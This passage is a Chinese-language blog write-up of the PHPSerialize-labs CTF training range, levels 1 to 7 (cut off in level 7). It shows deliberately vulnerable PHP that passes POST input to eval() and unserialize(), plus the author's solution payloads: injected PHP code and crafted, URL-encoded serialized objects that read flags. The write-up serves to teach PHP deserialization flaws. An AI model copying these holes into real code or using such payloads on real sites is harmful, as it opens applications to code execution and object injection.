        <content type="html"><![CDATA[<h1 id="Writeup-of-PHPSerializelabs"><a href="#Writeup-of-PHPSerializelabs" class="headerlink" title="Writeup of PHPSerializelabs"></a>Writeup of PHPSerializelabs</h1><p>反序列化靶场<code>PHPSerializelabs</code>的个人Wp</p><br /><h3 id="Level-1-类的实例化"><a href="#Level-1-类的实例化" class="headerlink" title="Level 1: 类的实例化"></a>Level 1: 类的实例化</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 1 : 类的实例化 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：尝实例化下面的FLAG类吧！</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag_string</span> = <span class="string">&quot;HelloCTF&#123;？？？？&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;flag_string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure><p>实例化测试，我们传入的参数会作为php代码执行，POST传入<code>code=$a=new FLAG;</code>获取flag</p><p>这里有<code>__construct()</code>方法，我们传入的指令实例化时会自动打印属性<code>$flag_string</code>值</p><br /><h3 id="Level-2-对象中值的传递"><a href="#Level-2-对象中值的传递" class="headerlink" title="Level 2: 对象中值的传递"></a>Level 2: 对象中值的传递</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 2 : 类值的传递 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：尝试将flag传递出来~</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"> <span class="variable">$flag_string</span> = <span class="string">&quot;HelloCTF&#123;？？？？&#125;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$free_flag</span> = <span class="string">&quot;???&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">get_free_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;free_flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$target</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$code</span>))&#123;</span><br><span class="line">       <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">       <span class="variable">$target</span>-&gt;<span class="title function_ invoke__">get_free_flag</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;source&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们尝试将<code>$flag_string</code>的值传递到<code>$free_flag</code>中，<code>$free_flag</code>是公共属性，可以直接复赋值，题目会调用<code>get_free_flag</code>方法打印<code>$target-&gt;free_flag</code>的值</p><p>传递<code>code=$target-&gt;free_flag=$flag_string;</code>获得flag</p><br /><h3 id="Level-3-对象中值的权限"><a href="#Level-3-对象中值的权限" class="headerlink" title="Level 3: 对象中值的权限"></a>Level 3: 对象中值的权限</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 3 : 对象中值的权限 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：尝试将flag传递出来~</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$public_flag</span> = <span class="string">&quot;HelloCTF&#123;?&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$protected_flag</span> = <span class="string">&quot;?&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$private_flag</span> = <span class="string">&quot;?&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_protected_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;protected_flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_private_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;private_flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubFLAG</span> <span class="keyword">extends</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_protected_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;protected_flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_private_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;private_flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="variable">$sub_target</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SubFLAG</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Trying to get FLAG...&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Public Flag: &quot;</span>.<span class="variable">$target</span>-&gt;public_flag.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Protected Flag:&quot;</span>.<span class="variable">$target</span>-&gt;protected_flag .<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Private Flag:&quot;</span>.<span class="variable">$target</span>-&gt;private_flag .<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察对象属性的权限，不能直接将protected和private的属性直接echo出来，思路是需要利用类内的方法返回出来，传递：</p><p><code>code=echo $target-&gt;public_flag.$target-&gt;get_protected_flag().$target-&gt;get_private_flag();</code></p><p>我们也可以用<code>sub_target</code>类中的<code>show_protected_flag()</code>方法获得<code>$protected_flag</code>,但是不能类似地获得<code>$private_flag</code>，因为private修饰的属性甚至不能在子类中访问</p><br /><h3 id="Level-4-序列化初体验"><a href="#Level-4-序列化初体验" class="headerlink" title="Level 4: 序列化初体验"></a>Level 4: 序列化初体验</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 4 : 序列化 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：嗯！？全是私有，怎么获取flag呢？试试序列化！</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG3</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag3_object_array</span> = <span class="keyword">array</span>(<span class="string">&quot;？&quot;</span>,<span class="string">&quot;？&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$flag1_string</span> = <span class="string">&quot;？&quot;</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$flag2_number</span> = <span class="string">&#x27;?&#x27;</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$flag3_object</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;flag3_object = <span class="keyword">new</span> <span class="title class_">FLAG3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag_is_here</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化会将类的所有属性（包括修饰属性）序列化，直接传递<code>code=echo serialize($flag_is_here);</code>获得flag，想要更清晰地看出flag格式可以用一些直接打印对象的函数</p><p><strong>能够清晰地打印出对象的函数：</strong></p><p><code>var_dump()</code>、<code>print_r()</code>、<code>var_export()</code></p><br /><h3 id="Level-5-序列化的普通值规则"><a href="#Level-5-序列化的普通值规则" class="headerlink" title="Level 5: 序列化的普通值规则"></a>Level 5: 序列化的普通值规则</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 5 : 序列化规则 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：各有千秋~</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a_class</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a_value</span> = <span class="string">&quot;HelloCTF&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a_object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a_class</span>();</span><br><span class="line"><span class="variable">$a_array</span> = <span class="keyword">array</span>(a=&gt;<span class="string">&quot;Hello&quot;</span>,b=&gt;<span class="string">&quot;CTF&quot;</span>);</span><br><span class="line"><span class="variable">$a_string</span> = <span class="string">&quot;HelloCTF&quot;</span>;</span><br><span class="line"><span class="variable">$a_number</span> = <span class="number">678470</span>;</span><br><span class="line"><span class="variable">$a_boolean</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$a_null</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">See How to serialize:</span><br><span class="line">a_object: O:<span class="number">7</span>:<span class="string">&quot;a_class&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;a_value&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;HelloCTF&quot;</span>;&#125;</span><br><span class="line">a_array: a:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Hello&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;CTF&quot;</span>;&#125;</span><br><span class="line">a_string: s:<span class="number">8</span>:<span class="string">&quot;HelloCTF&quot;</span>;</span><br><span class="line">a_number: i:<span class="number">678470</span>;</span><br><span class="line">a_boolean: b:<span class="number">1</span>;</span><br><span class="line">a_null: N;</span><br><span class="line">Now your turn!</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$your_object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line"><span class="variable">$your_array</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="variable">$your_string</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;s&#x27;</span>]);</span><br><span class="line"><span class="variable">$your_number</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;i&#x27;</span>]);</span><br><span class="line"><span class="variable">$your_boolean</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="variable">$your_NULL</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;n&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(</span><br><span class="line">    <span class="variable">$your_boolean</span> &amp;&amp; </span><br><span class="line">    <span class="variable">$your_NULL</span> == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">    <span class="variable">$your_string</span> == <span class="string">&quot;IWANT&quot;</span> &amp;&amp;</span><br><span class="line">    <span class="variable">$your_number</span> == <span class="number">1</span> &amp;&amp;</span><br><span class="line">    <span class="variable">$your_object</span>-&gt;a_value == <span class="string">&quot;FLAG&quot;</span> &amp;&amp;</span><br><span class="line">    <span class="variable">$your_array</span>[<span class="string">&#x27;a&#x27;</span>] == <span class="string">&quot;Plz&quot;</span> &amp;&amp; <span class="variable">$your_array</span>[<span class="string">&#x27;b&#x27;</span>] == <span class="string">&quot;Give_M3&quot;</span></span><br><span class="line">)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You really know how to serialize?&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要将符合题目条件的参数进行序列化后传递，就可以获得flag，构造参数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a_class</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a_value</span> = <span class="string">&quot;HelloCTF&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$your_object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a_class</span>();</span><br><span class="line"><span class="variable">$your_object</span>-&gt;a_value = <span class="string">&quot;FLAG&quot;</span>;</span><br><span class="line"><span class="variable">$your_array</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&quot;Plz&quot;</span>,<span class="string">&#x27;b&#x27;</span>=&gt;<span class="string">&quot;Give_M3&quot;</span>);</span><br><span class="line"><span class="variable">$your_string</span> = <span class="string">&quot;IWANT&quot;</span>;</span><br><span class="line"><span class="variable">$your_number</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$your_boolean</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$your_NULL</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;o=&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$your_object</span>).<span class="string">&quot;&amp;a=&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$your_array</span>).<span class="string">&quot;&amp;s=&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$your_string</span>).<span class="string">&quot;&amp;i=&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$your_number</span>).<span class="string">&quot;&amp;b=&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$your_boolean</span>).<span class="string">&quot;&amp;n=&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$your_NULL</span>).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>传递<code>o=O:7:&quot;a_class&quot;:1:{s:7:&quot;a_value&quot;;s:4:&quot;FLAG&quot;;}&amp;</code></p><p><code>a=a:2:{s:1:&quot;a&quot;;s:3:&quot;Plz&quot;;s:1:&quot;b&quot;;s:7:&quot;Give_M3&quot;;}&amp;</code></p><p><code>s=s:5:&quot;IWANT&quot;;&amp;i=i:1;&amp;</code></p><p><code>b=b:1;&amp;</code></p><p><code>n=N;</code>获得flag</p><br /><h3 id="Level-6-序列化的权限修饰规则"><a href="#Level-6-序列化的权限修饰规则" class="headerlink" title="Level 6: 序列化的权限修饰规则"></a>Level 6: 序列化的权限修饰规则</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 6 : 序列化规则_权限修饰 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：各有千秋~特别注意的权限修饰符x</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">protectedKEY</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$protected_key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;protected_key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">privateKEY</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$private_key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;private_key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">See Carfully~</span><br><span class="line"><span class="keyword">protected</span><span class="string">&#x27;s serialize: O%3A12%3A%22protectedKEY%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00protected_key%22%3BN%3B%7D</span></span><br><span class="line"><span class="string">private&#x27;</span>s serialize: O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>privateKEY%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>privateKEY%<span class="number">00</span>private_key%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$protected_key</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;protected_key&#x27;</span>]);</span><br><span class="line"><span class="variable">$private_key</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;private_key&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$protected_key</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$private_key</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$protected_key</span>-&gt;<span class="title function_ invoke__">get_key</span>() == <span class="string">&quot;protected_key&quot;</span> &amp;&amp; <span class="variable">$private_key</span>-&gt;<span class="title function_ invoke__">get_key</span>() == <span class="string">&quot;private_key&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;We Call it %00_Contr0l_Characters_NULL!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们要让<code>$protected_key-&gt;get_key()</code>的值为<code>&quot;protected_key&quot;</code>，<code>$private_key-&gt;get_key()</code>的值为<code>&quot;private_key&quot;</code></p><p>构造参数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">protectedKEY</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$protected_key</span>=<span class="string">&quot;protected_key&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;protected_key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">privateKEY</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$private_key</span>=<span class="string">&quot;private_key&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;private_key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">protectedKEY</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">privateKEY</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;protected_key=&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&amp;private_key=&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>)).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>url编码的作用是成功传入空字符，获得playload，传递后获得flag</p><p><code>protected_key=O%3A12%3A%22protectedKEY%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00protected_key%22%3Bs%3A13%3A%22protected_key%22%3B%7D</code><br><code>&amp;private_key=O%3A10%3A%22privateKEY%22%3A1%3A%7Bs%3A23%3A%22%00privateKEY%00private_key%22%3Bs%3A11%3A%22private_key%22%3B%7D</code></p><br /><h3 id="Level-7-实例化和反序列化"><a href="#Level-7-实例化和反序列化" class="headerlink" title="Level 7: 实例化和反序列化"></a>Level 7: 实例化和反序列化</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - 反序列化靶场 关卡 7 : 实例化和反序列化 --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">HINT：可控的输入 简单的漏洞演示 / FLAG in flag.php</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 探姬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span 